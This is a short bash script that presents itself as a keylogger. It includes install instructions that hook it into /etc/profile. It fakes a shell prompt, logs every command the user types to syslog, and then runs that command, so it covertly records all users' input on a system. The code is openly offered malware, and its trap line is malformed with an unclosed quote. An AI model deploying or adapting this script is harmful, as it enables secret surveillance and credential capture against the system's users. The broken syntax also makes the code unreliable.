#!/bin/bash
#This Script is simple keylogger using logger to syslog.
#To use it
#1. Save this script name keylogger
#2. Chmod 755 /root/keylogger
#3. edit /etc/profile add line bash /root/keylogger
#4. Default log at /var/log/messages . Enjoy
# [0day (xc) Our] 
# http://0dev.us.to

trap " 3 2 18 20 24 7

prompt_read() {
echo -n "$(whoami)@$(hostname):$(pwd)~$ "
read userinput
}

prompt_read

while :; do
if [[ $userinput != exit ]]; then
logger "$userinput"
bash -c "$userinput"
prompt_read
else
kill -1 $PPID
fi
done